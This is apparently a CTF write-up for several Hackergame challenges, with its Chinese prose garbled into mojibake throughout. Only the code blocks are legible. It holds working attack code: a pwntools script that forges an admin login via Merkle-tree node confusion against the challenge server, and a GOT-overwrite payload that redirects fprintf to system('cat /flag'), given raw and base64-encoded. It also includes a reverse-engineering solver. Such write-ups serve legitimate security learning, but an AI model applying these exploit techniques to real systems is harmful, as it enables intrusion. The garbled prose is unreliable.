è¸©äº†ä¸¤ä¸ªå‘ï¼š1.æ”¹å˜openå‚æ•°æŒ‡å‘çš„å†…å­˜çš„å¾ªç¯ä»£ç ï¼Œå¿…é¡»åœ¨openå‡½æ•°è°ƒç”¨ä¹‹å‰å°±å¯åŠ¨ï¼Œå¹¶åœ¨openæ‰§è¡Œä¹‹åå†è¿”å›ï¼Œä¸ºæ­¤åŠ äº†ä¸¤ä¸ªå¤§å¾ªç¯åšå¾®åŒæ­¥ï¼›2.å†…å­˜èµ‹å€¼çš„ä»£ç æŠ½äº†ä¸€ä¸ªstoreå‡½æ•°å‡ºæ¥ï¼Œä¼¼ä¹ç›´æ¥å†™ä¸¤ä¸ªè¿ç€çš„èµ‹å€¼ä¼šè¢«ç¼–è¯‘å™¨ä¼˜åŒ–æ‰å…¶ä¸­ä¸€ä¸ªã€‚  

## å¼‚æ˜Ÿæ­§é€”

ä½“éªŒå¾ˆç³Ÿç³•çš„ä¸€é“é¢˜ï¼Œæºäºé™¤äº†æ—§æ—¥ä¹‹ç—•çš„å¦å¤–ä¸‰é“binaryéƒ½Aæ‰åè¿™é¢˜ä»ç„¶ä¸ä¼šåšï¼Œç”šè‡³æ ¹æœ¬æ²¡ææ‡‚æŒ‰é’®ç‚¹å‡»åçš„é€»è¾‘å®šä¹‰åœ¨ä»€ä¹ˆåœ°æ–¹ï¼ˆä¸€å¤´æ‰è¿›åœ°å›¾ç¼–è¾‘å™¨ä¸­ï¼Œåªèƒ½åšåˆ°æ”¾æ–¹å—ï¼Œå´æ‰¾ä¸åˆ°æŒ‰é’®é€»è¾‘å¦‚ä½•å®šä¹‰ï¼‰ï¼Œé‚£ç§æœ‰åŠ›æ²¡å¤„ä½¿çš„æ„Ÿè§‰éå¸¸ä¸çˆ½ã€‚  

å®¹æ˜“æœåˆ°çš„æ–‡æ¡£éƒ½é»˜è®¤çœç•¥äº†è¿™ä¸ªå…³äºæ¸¸æˆæ“ä½œçš„è¿‡äºåŸºç¡€çš„é—®é¢˜ï¼ˆä½†å¯¹äºä¸€ä¸ªåˆæ¬¡ä¸Šæ‰‹æ­¤æ¸¸æˆçš„äººï¼ŒåŸºç¡€çš„æ“ä½œå¾€å¾€æ‰æ˜¯å¤§é—®é¢˜ï¼‰ã€‚  

ç›´åˆ°ç¬¬ä¸‰å¤©ï¼Œè¿™é¢˜çš„åšå‡ºäººæ•°å·²ç»éå¸¸å¤šäº†ï¼Œæ²¡åŠæ³•åªèƒ½ç»§ç»­æœæ•™ç¨‹å­¦ç©æ³•ã€‚ï¼ˆä½†æ˜¯æˆ‘åªæƒ³é€†æŒ‰é’®é€»è¾‘ï¼Œå¯¹æ¸¸æˆæœ¬èº«æ¯«æ— å…´è¶£â€¦â€¦ä½“éªŒæ„ŸæŒç»­\-\-ï¼‰    

æœ€åç»ˆäºæ‰¾åˆ°äº†è¿™ç¯‡ï¼šhttps://www.9game.cn/news/5021459.html ï¼Œé‡Œé¢çš„â€œç»™å¤„ç†å™¨æ·»åŠ æŒ‡ä»¤â€éƒ¨åˆ†æåˆ°äº†åŸºç¡€æ“ä½œï¼šåœ¨æ¸¸æˆä¸­æ‰¾åˆ°ä»£è¡¨å¤„ç†å™¨çš„æ–¹å—ï¼Œç‚¹å‡»å®ƒï¼Œå†ç‚¹å‡»ä¸‹é¢çš„ç¼–è¾‘æŒ‰é’®ï¼Œå°±èƒ½çœ‹åˆ°é€»è¾‘äº†ã€‚  

å‰ä¸¤ç»„é€»è¾‘å¾ˆå®¹æ˜“é€†æ¨ï¼›ç¬¬å››ç»„åœ¨åœ°å›¾ä¸Šä¹±è¯•å‘ç°ä¸éé—¨ç­‰ç»“æ„ï¼Œä½†è¯•ç€è¯•ç€å°±è¿‡äº†ï¼›ç¬¬ä¸‰ç»„èŠ±è´¹æ—¶é—´æœ‰ç‚¹é•¿ï¼ˆä½†å…¶å®1/256å·²ç»å¯ä»¥è€ƒè™‘è¿æ¥æœåŠ¡å™¨çˆ†ç ´äº†ï¼‰ï¼Œä¸è¿‡å¤§æ¦‚å‘ç°å†·å´æ¶²è¦å…ˆäºé’ååº”å †äº§ç”Ÿï¼›å¤šæ¬¡è¯•éªŒåç¬¬2å’Œç¬¬7ä¸ªæŒ‰é’®çš„åŠŸèƒ½ä»ç„¶æ²¡ææ¸…æ¥šï¼ˆæƒ³ææ¸…æ¥šåˆè¦å­¦ä¹ ä¸€å¤§å †é¢˜ç›®ä¹‹å¤–æ¯«æ— å…´è¶£çš„æ¸¸æˆæœ¬èº«çš„æœºåˆ¶â€¦â€¦ï¼‰ï¼Œå››ç§æƒ…å†µè¿æ¥æœåŠ¡å™¨æ‰‹åŠ¨çˆ†ç ´ã€‚    

## å¾®ç§¯åˆ†è®¡ç®—å°ç»ƒä¹  2.0 ï¼ˆæœªå®Œæˆï¼‰

geekgameçš„xssåœ¨äºŒé˜¶æ®µæ”¾å‡ºæç¤ºåä»ç„¶æ²¡åšå‡ºæ¥ï¼Œè€Œè¿™é¢˜ä¹Ÿæ˜¯xssï¼Œç›´æ¥æ”¾å¼ƒï¼ˆå¦ä¸€ä¸ªåŸå› ï¼Œæ¯”èµ›ååŠç¨‹è‡ªå·±çš„ä¸šä½™æ—¶é—´åŸºæœ¬åœ¨ç£•mathå’Œæ‘†çƒ‚ä¹‹é—´åå¤æ¨ªè·³ï¼‰  

## é€†å‘å·¥ç¨‹ä¸éœ€è¦ F5

IDA F5 yydsï¼è‡³äºä¸èƒ½F5çš„é€†å‘â€¦â€¦é‚£è‚¯å®šæ˜¯æ¢é¢˜åšèƒ½F5çš„é€†å‘    

è¿™é¢˜æŠŠå‡½æ•°ä¸­é—´çš„é€»è¾‘æ‹†åˆ†åˆ°å¤šä¸ªdllä¸­ï¼Œå¯¼è‡´ä¸»å‡½æ•°F5çœ‹åˆ°çš„é€»è¾‘å¹¶ä¸å®Œæ•´ã€‚æ—¢ç„¶é¢˜ç›®ç›´æ¥F5ä¸å¤ªè¡Œï¼Œé‚£å°±ä¿®ç†å®ƒç›´åˆ°èƒ½F5ä¸ºæ­¢!  

å¥½åœ¨dllæ•°é‡ä¸ç®—å¤ªå¤šï¼Œç¬¬ä¸€æ­¥å…ˆæŠŠdllé‡Œçš„ä»£ç å¡«å›åˆ°ä¸»ç¨‹åºä¸­ã€‚å¦å¤–ï¼Œé€†å‘å·¥ç¨‹ä¸éœ€è¦è°ƒè¯•å™¨(x)ï¼Œæ‰€ä»¥éšä¾¿åœ¨\.textæ®µæ‰¾ä¸€ä¸ªåœ°å€å¡«å……ï¼ˆ0x2000(å¯¹åº”æ–‡ä»¶åç§»0x1400)çœ‹èµ·æ¥ä¸é”™ï¼Œæ˜¯ä¸ªæ•´æ•°ï¼‰ï¼Œåæ­£ç»å¯¹ä¸ä¼šå»è¿è¡Œä¸»ç¨‹åºçš„(x)ï¼ˆè¿™é¢˜é€»è¾‘ä¸é•¿ï¼Œå¦‚æœèƒ½æŠŠF5ä¿®åˆ°æºç çº§åˆ«ï¼ŒåŠ¨è°ƒéƒ½æ˜¯æµ®äº‘ï¼‰ã€‚  

```python
with open("main.exe", "rb") as f:
    allcontent = f.read()

def do_patch(s, offset, buf):
    s[offset:offset+len(buf)] = buf

def do_port(s, offset, dllfile, dlloffset, length):
    with open(dllfile, "rb") as f:
        tmp = f.read()
    buf = tmp[dlloffset:dlloffset+length]
    do_patch(s, offset, buf)

s = bytearray(allcontent)

do_port(s, 0x1400, "libs00.dll", 0x400, 0x1c)    # 1d4e
do_port(s, 0x1420, "libs01.dll", 0x400, 0x23)    # ac57
do_port(s, 0x1450, "libs02.dll", 0x400, 0x14)    # 1a01
do_port(s, 0x1470, "libs03.dll", 0x400, 0x21)    # 961a
do_port(s, 0x14a0, "libs04.dll", 0x400, 0x12)    # 9acf
do_port(s, 0x14c0, "libs05.dll", 0x400, 0x22)    # 6c6b
do_port(s, 0x14f0, "libs06.dll", 0x400, 0x1c)    # 63f7
do_port(s, 0x1510, "libs07.dll", 0x400, 0x34)    # 4fe5
do_port(s, 0x1550, "libs08.dll", 0x400, 0x13)    # c158
do_port(s, 0x1570, "libs09.dll", 0x400, 0xe)    # f6ec
do_port(s, 0x1580, "libs10.dll", 0x400, 0xc)    # 03a9
do_port(s, 0x1590, "libs11.dll", 0x400, 0x7)    # 62a2
do_port(s, 0x15a0, "libs12.dll", 0x400, 0x7)    # 1ec4
do_port(s, 0x15b0, "libs13.dll", 0x400, 0x7)    # dc78
# do_port(s, 0x15c0, "libs14.dll", 0x400, )    # c55f
# do_port(s, 0x1500, "libs14.dll", 0x400, )    # 0d12

with open("main_patched1.exe", "wb") as f:
    f.write(s)
```

æ¥ä¸‹æ¥ï¼Œåœ¨IDAé‡Œç”¨keypatchæ‰‹åŠ¨patchå„å¤„å¤–éƒ¨è°ƒç”¨ï¼Œå°†å…¶patchä¸ºå¯¹å¡«å……ä»£ç çš„è°ƒç”¨ï¼ˆæ¼«é•¿çš„å‘¨å…­ä¸‹åˆï¼‰ï¼š  
```c
bool __usercall __spoils<rax> sub_140001440@<sil>(char *a1@<rax>)
{
  return *(_WORD *)(a1 + 37) != '}';
}

void __usercall sub_1400014C0(_DWORD *a1@<r10>)
{
  *a1 = calc_add((unsigned int)*a1, 1i64);
}

_QWORD __usercall __spoils<rbx> calc_add@<rbx>(__int64 a1@<r14>, __int64 a2@<r13>)
{
  return a2 + a1;
}

_QWORD __usercall __spoils<r9> calc_shl@<r9>(__int64 a1@<r14>, __int64 a2@<r15>)
{
  return a1 << a2;
}

_QWORD __usercall __spoils<r9> calc_xor@<r9>(__int64 a1@<r14>, __int64 a2@<r15>)
{
  return a2 ^ a1;
}

void __usercall sub_1400014C0(_DWORD *a1@<r10>)
{
  *a1 = calc_add((unsigned int)*a1, 1i64);
}

_QWORD __usercall __spoils<r10> sub_140002150@<r10>(char *a1@<r10>, char **a2@<rbx>, int *a3@<r14>)
{
  __int64 result; // r10

  result = (__int64)(a1 + 5);
  *a2 = (char *)result;
  *a3 = 0;
  return result;
}

_QWORD __usercall sub_140001470@<r9>(unsigned int *a1@<rdx>, _QWORD *a2@<r15>)
{
  __int64 v3; // r15
  __int64 result; // r9

  v3 = (unsigned int)calc_shl(*a1, 4i64);
  result = calc_xor(0x55AA00FFi64, v3);
  *a2 = result;
  return result;
}

void __usercall sub_140002070(
        _OWORD *a1@<rax>,
        _QWORD *a2@<rcx>,
        _DWORD *a3@<rdx>,
        int a4@<r10d>,
        _QWORD *a5@<rbx>,
        unsigned int *a6@<r14>)
{
  *a1 = a4;
  *a2 = *a5;
  *a3 = *a6;
}

__int64 __usercall sub_140002110@<rax>(
        _OWORD *a@<r15>,
        int a2@<r14d>,
        unsigned __int64 a3@<r11>,
        unsigned __int64 a4@<r13>)
{
  __int64 i; // rsi
  unsigned __int128 v; // rax

  i = a2;
  v = a[i] * __PAIR128__(a4, a3);
  a[i] = v;
  return v;
}

_QWORD *__usercall sub_1400020C0@<rax>(_QWORD *a1@<r14>, _QWORD *a2@<rax>, _QWORD **a3@<r10>, int *a4@<rbx>)
{
  _QWORD *v3; // r8
  __int64 v4; // rsi

  v3 = *a3;
  v4 = *a4;
  *a1 = &(*a3)[v4];
  *a2 = v3[v4];
  return a2;
}

void __usercall sub_140001700(_QWORD *a1@<rdx>, _QWORD *a2@<r10>)
{
  *a1 = calc_xor(a2, 0x7A026655FD263677i64);
}

void __usercall sub_140001550(_QWORD *a1@<r13>, unsigned int *a2@<r14>)
{
  unsigned int v2; // r9d

  v2 = calc_shl(*a2, 2i64);
  *a1 = calc_xor(0xDEADBEEFi64, v2);
}

void __usercall sub_140002050(
        _QWORD *a1@<rcx>,
        _QWORD *a2@<rdx>,
        _DWORD *a3@<r15>,
        _QWORD *a4@<r10>,
        int *a5@<r14>,
        int a6@<r13d>)
{
  *a3 = a6;
  *a1 = *a4;
  *a2 = *a5;
}

void __usercall calc__mul(_DWORD *a1@<r14>, __int64 a2@<r15>, int a3@<r13d>)
{
  a1[a2] *= a3;
}

void __usercall sub_140002020(_QWORD *a1@<r12>, _DWORD *a2@<r10>, unsigned __int16 **a3@<rdx>, int *a4@<r15>)
{
  unsigned __int16 *a3_; // r8
  __int64 a4_; // rsi

  a4_ = *a4;
  a3_ = *a3;
  *a1 = &(*a3)[a4_];
  *a2 = a3_[a4_];
}

void __usercall sub_140001740(_WORD *a1@<rbx>, unsigned int a2@<r10d>)
{
  *a1 = calc_xor(a2, 0xCDECi64);
}

void __usercall sub_140001640(_QWORD *a1@<rdx>, unsigned int *a2@<r10>)
{
  unsigned int v2; // r9d

  v2 = calc_shl(*a2, 1i64);
  *a1 = calc_xor(33i64, v2);
}

void __usercall sub_140002000(
        _DWORD *a1@<r15>,
        _QWORD *a2@<rcx>,
        _BYTE *a3@<rdx>,
        int a4@<eax>,
        char **a5@<r10>,
        int *a6@<r11>)
{
  char *v5; // rax
  __int64 v6; // rsi

  *a1 = a4;
  v5 = *a5;
  v6 = *a6;
  *a2 = &(*a5)[v6];
  *a3 = v5[v6];
}

bool __usercall sub_1400020F0@<bl>(_BYTE *a1@<r14>, char a2@<r15b>, char a3@<r13b>, _DWORD *a4@<r12>)
{
  *a1 = a2 * a3;
  return *a4 == 3;
}

void __usercall sub_1400020A0(_DWORD *a1@<r14>, char **a2@<r10>, int *a3@<rbx>)
{
  *a1 = (unsigned __int8)(*a2)[*a3];
}

bool __usercall sub_140001780@<bl>(int *a1@<r13>, int a2@<r10d>)
{
  return a2 != HACKERGAME[*a1];
}

void __usercall sub_140001740(_WORD *a1@<rbx>, unsigned int a2@<r10d>)
{
  *a1 = calc_xor(a2, 0xCDECi64);
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  char i_______; // [rsp+2Bh] [rbp-1ADh] BYREF
  int j__; // [rsp+2Ch] [rbp-1ACh] BYREF
  unsigned int i_____; // [rsp+30h] [rbp-1A8h] BYREF
  unsigned int i____; // [rsp+34h] [rbp-1A4h] BYREF
  unsigned int j; // [rsp+38h] [rbp-1A0h] BYREF
  int i___; // [rsp+3Ch] [rbp-19Ch] BYREF
  unsigned int i_; // [rsp+40h] [rbp-198h] BYREF
  int j_; // [rsp+44h] [rbp-194h] BYREF
  int i; // [rsp+48h] [rbp-190h] BYREF
  int v13; // [rsp+4Ch] [rbp-18Ch]
  char content[12]; // [rsp+50h] [rbp-188h] BYREF
  unsigned int v15; // [rsp+5Ch] [rbp-17Ch] BYREF
  int v16; // [rsp+60h] [rbp-178h] BYREF
  int j___; // [rsp+64h] [rbp-174h] BYREF
  int tmp__; // [rsp+68h] [rbp-170h] BYREF
  int tmp____; // [rsp+6Ch] [rbp-16Ch] BYREF
  __int64 tmp1; // [rsp+70h] [rbp-168h] BYREF
  _QWORD *v21; // [rsp+78h] [rbp-160h] BYREF
  _QWORD *v22; // [rsp+80h] [rbp-158h] BYREF
  __int64 tmp_; // [rsp+88h] [rbp-150h] BYREF
  _WORD *v24; // [rsp+90h] [rbp-148h] BYREF
  __int64 tmp___; // [rsp+98h] [rbp-140h] BYREF
  _OWORD *content_; // [rsp+A0h] [rbp-138h] BYREF
  _DWORD *content__; // [rsp+A8h] [rbp-130h] BYREF
  __int64 j_____; // [rsp+B0h] [rbp-128h] BYREF
  _BYTE *content___; // [rsp+B8h] [rbp-120h] BYREF
  __int64 tmp1_; // [rsp+C0h] [rbp-118h] BYREF
  unsigned __int64 v31; // [rsp+C8h] [rbp-110h]
  char Buf1[48]; // [rsp+D0h] [rbp-108h] BYREF

  v13 = 0;
  puts(HACKERGAME0);
  scanf(HACKERGAME1, Buf1, 39i64);
  if ( !memcmp(Buf1, "flag{", 5ui64) && !sub_140001440(Buf1) )
  {
    sub_140002150(Buf1, (char **)content, &i);
    while ( i < 4 )
    {
      for ( j_ = 0; j_ < 2; add_1_(&j_) )
      {
        sub_140001470(&i, &tmp1);
        sub_140002070(&tmp1_, &content_, &j___, tmp1, content, (unsigned int *)&j_);
        sub_140002110(content_, j___, tmp1_, v31);
      }
      add_1(&i);
    }
    for ( i_ = 0; (int)i_ < 4; add_1__(&i_) )
    {
      sub_1400020C0(&v21, &v22, (_QWORD **)content, (int *)&i_);
      sub_140001700(v21, v22);
    }
    for ( i___ = 0; i___ < 4; add_1_______(&i___) )
    {
      for ( j = 0; (int)j < 8; add_1___(&j) )
      {
        sub_140001550(&tmp_, (unsigned int *)&i___);
        sub_140002050(&content__, &j_____, &tmp__, content, (int *)&j, tmp_);
        calc_subscript_mul(content__, j_____, tmp__);
      }
    }
    for ( i____ = 0; (int)i____ < 16; add_1____(&i____) )
    {
      sub_140002020(&v24, &v15, (unsigned __int16 **)content, (int *)&i____);
      sub_140001740(v24, v15);
    }
    for ( i_____ = 0; (int)i_____ < 4; add_1_____(&i_____) )
    {
      for ( j__ = 0; j__ < 32; add_1______(&j__) )
      {
        sub_140001640(&tmp___, &i_____);
        sub_140002000(&tmp____, &content___, &i_______, tmp___, (char **)content, &j__);
        if ( sub_1400020F0(content___, tmp____, i_______, &i_____) )
        {
          sub_1400020A0(&v16, (char **)content, &j__);
          if ( sub_140001780(&j__, v16) )
            goto LABEL_31;
        }
      }
    }
    puts(HACKERGAME2);
    return 0;
  }
  else
  {
LABEL_31:
    puts(HACKERGAME3);
    return 0;
  }
}
```

æ¢å¤çš„é‡ç‚¹æ˜¯å‚ç…§æ±‡ç¼–ç”¨\_\_usercallä¿®æ­£å‡½æ•°çš„è°ƒç”¨çº¦å®šã€‚ä¸è¿‡ä»ä¿®å¤ç»“æœçœ‹ï¼Œè¿™äº›æŠ½å‡ºçš„å¹¶ä¸æ˜¯çœŸçš„å‡½æ•°ï¼Œè€Œä»…ä»…æ˜¯ä¸­é—´çš„ä»£ç ç‰‡æ®µï¼Œæ‰€ä»¥æ›´å¥½çš„ä¿®å¤æ–¹æ³•åº”å½“æ˜¯patchä¸ºjmpè€Œä¸æ˜¯callï¼Œè¿™æ ·F5å¤§æ¦‚èƒ½ç»™å‡ºå®Œç¾çš„åç¼–è¯‘ç»“æœã€‚  

ä¸è¿‡ï¼Œç›®å‰çš„ä¿®å¤æƒ…å†µå·²ç»è¶³å¤Ÿç”¨pythonå¤ç°é€»è¾‘äº†ï¼Œä¹‹åçš„æ±‚è§£ä¹Ÿå¹¶ä¸å¤æ‚ï¼š  
```python
def p128(n):
    return (n & ((1<<128)-1)).to_bytes(16, 'little')

def u128(s):
    assert len(s) == 16
    return int.from_bytes(s, 'little')

def p64(n):
    return (n & ((1<<64)-1)).to_bytes(8, 'little')

def u64(s):
    assert len(s) == 8
    return int.from_bytes(s, 'little')

def p32(n):
    return (n & ((1<<32)-1)).to_bytes(4, 'little')

def u32(s):
    assert len(s) == 4
    return int.from_bytes(s, 'little')

def p16(n):
    return (n & ((1<<16)-1)).to_bytes(2, 'little')

def u16(s):
    assert len(s) == 2
    return int.from_bytes(s, 'little')


def foo(s):
    assert len(s) == 32
    s = bytearray(s)

    for i in range(4):
        for j in range(2):
            tmp = (i << 4) ^ 0x55AA00FF
            v = u128(s[16*j:16*(j+1)])
            s[16*j:16*(j+1)] = p128(v * tmp)

    for i in range(4):
        tmp = u64(s[8*i:8*(i+1)])
        s[8*i:8*(i+1)] = p64(tmp ^ 0x7A026655FD263677)

    for i in range(4):
        for j in range(8):
            tmp = (i << 2) ^ 0xDEADBEEF
            v = u32(s[4*j:4*(j+1)])
            s[4*j:4*(j+1)] = p32(v * tmp)

    for i in range(16):
        tmp = u16(s[2*i:2*(i+1)])
        s[2*i:2*(i+1)] = p16(tmp ^ 0xCDEC)

    for i in range(4):
        for j in range(32):
            tmp = (i<<1)^ 33
            v = s[j]
            s[j] = (v * tmp) & 0xff

    return s


def bar(s):
    s = bytearray(s)
    assert len(s) == 32

    for i in range(3, -1, -1):
        for j in range(31, -1, -1):
            tmp = (i<<1) ^ 33
            tmp = pow(tmp, -1, 1<<8)
            v = s[j]
            s[j] = (v * tmp) & 0xff

    for i in range(15, -1, -1):
        tmp = u16(s[2*i:2*(i+1)])
        s[2*i:2*(i+1)] = p16(tmp ^ 0xCDEC)

    for i in range(3, -1, -1):
        for j in range(7, -1, -1):
            tmp = (i << 2) ^ 0xDEADBEEF
            tmp = pow(tmp, -1, 1<<32)
            v = u32(s[4*j:4*(j+1)])
            s[4*j:4*(j+1)] = p32(v * tmp)

    for i in range(3, -1, -1):
        tmp = u64(s[8*i:8*(i+1)])
        s[8*i:8*(i+1)] = p64(tmp ^ 0x7A026655FD263677)

    for i in range(3, -1, -1):
        for j in range(1, -1, -1):
            tmp = (i << 4) ^ 0x55AA00FF
            tmp = pow(tmp, -1, 1<<128)
            v = u128(s[16*j:16*(j+1)])
            s[16*j:16*(j+1)] = p128(v * tmp)

    return s


final_data = bytes.fromhex("""
9F 87 77 A2 B0 F8 D1 00  3C 4A 7C AC DA 42 27 E1
CF 2C D9 63 0A B2 A2 B4  71 77 EC 96 A9 81 2B E7
""")

flag = bar(final_data)
assert foo(flag) == final_data

print("flag{"+flag.decode()+"}")
```

## O(1) ç”¨æˆ·ç™»å½•ç³»ç»Ÿ

é¢˜ç›®å®ç°çš„merkle treeæ— æ³•åŒºåˆ†å¶å­èŠ‚ç‚¹ä¸ä¸­é—´èŠ‚ç‚¹ï¼ŒåŒæ—¶sha1æœ‰é•¿åº¦æ‹“å±•æ”»å‡»å’Œé€‰æ‹©å‰ç¼€ç¢°æ’ã€‚  

ä¸€å¼€å§‹çº ç»“äºä¸‰æ¡è·¯åº”è¯¥èµ°å“ªä¸€æ¡ã€‚å‚ä¸hashçš„å­—ç¬¦ä¸²é•¿åº¦éƒ½ä¸æ˜¯å¾ˆé•¿ï¼Œsha1ç›¸å…³çš„æ”»å‡»å¾ˆéš¾å®ç°ï¼Œmerkle treeæ›´åƒæœ¬é¢˜çš„è€ƒç‚¹ã€‚  

å¦‚æœä¸æ¶‰åŠsha1çš„æ”»å‡»ï¼Œé‚£ä¹ˆæœ€ç»ˆ"admin:..."çš„hashå¿…å®šè¦å‡ºç°åœ¨merkel treeçš„æŸä¸ªä½ç½®ä¸Šã€‚æ€è·¯ä¸€åº¦å—é™è®¤ä¸ºloginç»™çš„æ ‘åº”å½“æ¯”import usersçš„æ ‘çŸ®ï¼Œåæ¥æ‰å‘ç°åè¿‡æ¥ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚  

æ‰€ä»¥ï¼Œè®©"admin:..."çš„hashä½œä¸ºloginçš„æ ‘çš„å¶å­èŠ‚ç‚¹ï¼Œç„¶åæŠŠè¿™ä¸ªæ ‘çš„ä¸­é—´èŠ‚ç‚¹ä½œä¸ºå¶å­èŠ‚ç‚¹åœ¨import usersæ—¶æäº¤ã€‚ç¨å¾®çˆ†ç ´ä¸€ä¸‹æ‰¾åˆ°æ»¡è¶³":"å’Œutf8è§£ç æ¡ä»¶çš„è¾“å…¥ã€‚  

```python
from pwn import *

import string
import random
from hashlib import sha1

if 0:
    while True:
        try:
            m11 = b"admin:" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)).encode()
            h11 = sha1(m11).digest()
            h11.decode()
            break
        except UnicodeDecodeError:
            pass

    print("find:")  # "nni9unrwum"
    assert 0

m11 = b'admin:nni9unrwum'
h11 = sha1(m11).digest()
print(h11.hex())
print(h11.decode())

h12 = b"0:"+b"b"*18

assert h12 < h11
m1 = h12+h11
print(len(m1))
print(m1)

h1 = sha1(m1).digest()
print(h1.hex())

m2 = b"c:d"
h2 = sha1(m2).digest()
print(h2.hex())


# s = process("python3 o1login.py", shell=True)
s = remote("202.38.93.111", 10094)
s.sendlineafter(b"Please input your token: ", b"<>")

s.sendlineafter(b"Choice: ", b"1")
s.sendlineafter(b"> ", m1)
s.sendlineafter(b"> ", m2)
s.sendlineafter(b"> ", b"EOF")
s.sendlineafter(b"Choice: ", b"2")
s.sendlineafter(b"Login credential: ", m11+b":"+h12.hex().encode()+h2.hex().encode())
s.interactive()
```

## é“¾ä¸ŠçŒæ‰‹ ï¼ˆæœªå®Œæˆï¼‰

æ²¡çœ‹é¢˜  

## It's MyCalculator!!!!!

checksecçœ‹åˆ°å¼€äº†pieï¼Œgotè¡¨å¯å†™  

GETå’ŒPUTå¯ä»¥é€‰å®šåç§»ï¼ŒIDAé€†å‘å‘ç°æ­¤å¤„æŒ‰ç…§æœ‰ç¬¦å·æ•°æ£€æŸ¥ï¼Œå®æµ‹æ­¤å¤„çš„atoiå¯¹äºunsigned intçš„å¤§æ•´æ•°å¯ä»¥å¾—åˆ°è´Ÿæ•°ç»•è¿‡æ£€æŸ¥å®ç°è´Ÿå‘æº¢å‡ºï¼Œç›¸å½“äºè·å¾—äº†bssæ®µä¸Šç¼“å†²åŒºä¹‹å‰ç›¸å¯¹ä½ç½®çš„ä»»æ„å†…å­˜è¯»å†™ã€‚  

gotè¡¨å¯å†™ï¼Œè¿™äº›å‡½æ•°åªæœ‰fprintfçš„ç¬¬ä¸€ä¸ªå‚æ•°å®¹æ˜“æ§åˆ¶ï¼ˆstderrï¼Œæ°å¥½åœ¨bssæ®µä¸Šæº¢ç¼“å†²åŒºä¹‹å‰çš„ä½ç½®ï¼‰ï¼Œè€Œä¸”fprintfçš„è§¦å‘æ—¶æœºå¯æ§ã€‚  

gotè¡¨å·²å¡«å……çš„é¡¹ç»è¿‡åŠ å‡å¯ä»¥å¾—åˆ°libcçš„åœ°å€ï¼Œgotè¡¨æœªå¡«å……çš„é¡¹ç»è¿‡åŠ å‡å¯ä»¥å¾—åˆ°ç¨‹åºæœ¬èº«çš„åœ°å€ï¼ˆbssæ®µåŒ…å«åœ¨å…¶ä¸­ï¼‰ã€‚  
é¢„å…ˆåœ¨bssæ®µçš„ç©ºé—²ä½ç½®å†™å…¥"cat /flag\0"å­—ç¬¦ä¸²ï¼Œç„¶ååˆ©ç”¨ç¨‹åºæœ¬èº«çš„åœ°å€è®¡ç®—å‡ºè¿™ä¸ªå†™å…¥å­—ç¬¦ä¸²çš„åœ°å€ï¼Œè¦†ç›–åˆ°bssæ®µstderrçš„ä½ç½®ï¼›å†åˆ©ç”¨libcçš„åœ°å€è®¡ç®—å‡ºsystemå‡½æ•°çš„åœ°å€ï¼Œå†™å…¥fprintfçš„gotè¡¨é¡¹çš„ä½ç½®ã€‚æœ€åè§¦å‘fprintf(stderr, ...)çš„è°ƒç”¨ï¼Œå®é™…ä¸Šè°ƒç”¨çš„æ˜¯system("cat /flag")ï¼Œå³å¯è·å¾—flagã€‚  
æ³¨æ„GETå’ŒPUTçš„è¯»å†™ä»¥4å­—èŠ‚ä¸ºå•ä½ï¼Œ8å­—èŠ‚çš„åœ°å€éœ€è¦åˆ†ä¸¤æ¬¡ã€‚  

æ•´ä¸ªè¿‡ç¨‹ä¸æ¶‰åŠäºŒæ¬¡è¯»å–stdinï¼Œå› æ­¤æ²¡æœ‰é‡åˆ°å®˜æ–¹writeupæåˆ°çš„stdin ttyç¼“å†²é€ æˆgetcè¯»å–å¤±è´¥çš„é—®é¢˜ï¼Œä¹Ÿä¸éœ€è¦é¢å¤–çš„è¾“å…¥å¡«å……ã€‚  

ç”Ÿæˆpayloadçš„ä»£ç ï¼š  
```python
s = (""
f"PUT {(-4) & 0xffffffff} {u32(b'cat ')}\n"  # 0x55555555a0f0
f"PUT {(-3) & 0xffffffff} {u32(b'/fla')}\n"
f"PUT {(-2) & 0xffffffff} {ord('g')}\n"

f"PUT 0 GET {(-44) & 0xffffffff} + {0x55555555a100-0x5555555550d6}\n"  # result_buffer[0] = LODWORD(&result_buffer)
f"PUT 1 GET {(-43) & 0xffffffff}\n"  # result_buffer[1] = HIDWORD(&result_buffer)

# stderr = 0x55555555a0f0
f"PUT {(-8) & 0xffffffff} GET 0 - 16\n"
f"PUT {(-7) & 0xffffffff} GET 1\n"

# result_buffer[2] = &system_libc
f"PUT 2 GET {(-48) & 0xffffffff} - {0x524c0-0x4c3a0}\n"
f"PUT 3 GET {(-47) & 0xffffffff}\n"

# fprintf@got = &system_libc
f"PUT {(-44) & 0xffffffff} GET 2\n"
f"PUT {(-43) & 0xffffffff} GET 3"

"")

print(s, end="")
```

ç”Ÿæˆçš„payloadï¼šï¼ˆæ³¨æ„æœ€åä¸€è¡Œæ²¡æœ‰å›è½¦ï¼Œç›®çš„æ˜¯è¯­æ³•é”™è¯¯è§¦å‘å¯¹fprintfçš„è°ƒç”¨ï¼‰  
```
PUT 4294967292 544498019
PUT 4294967293 1634493999
PUT 4294967294 103
PUT 0 GET 4294967252 + 20522
PUT 1 GET 4294967253
PUT 4294967288 GET 0 - 16
PUT 4294967289 GET 1
PUT 2 GET 4294967248 - 24864
PUT 3 GET 4294967249
PUT 4294967252 GET 2
PUT 4294967253 GET 3
```
base64ä¹‹åï¼š  
```
UFVUIDQyOTQ5NjcyOTIgNTQ0NDk4MDE5ClBVVCA0Mjk0OTY3MjkzIDE2MzQ0OTM5OTkKUFVUIDQyOTQ5NjcyOTQgMTAzClBVVCAwIEdFVCA0Mjk0OTY3MjUyICsgMjA1MjIKUFVUIDEgR0VUIDQyOTQ5NjcyNTMKUFVUIDQyOTQ5NjcyODggR0VUIDAgLSAxNgpQVVQgNDI5NDk2NzI4OSBHRVQgMQpQVVQgMiBHRVQgNDI5NDk2NzI0OCAtIDI0ODY0ClBVVCAzIEdFVCA0Mjk0OTY3MjQ5ClBVVCA0Mjk0OTY3MjUyIEdFVCAyClBVVCA0Mjk0OTY3MjUzIEdFVCAz
```

## å° Z çš„è°œé¢˜ ï¼ˆæœªå®Œæˆï¼‰

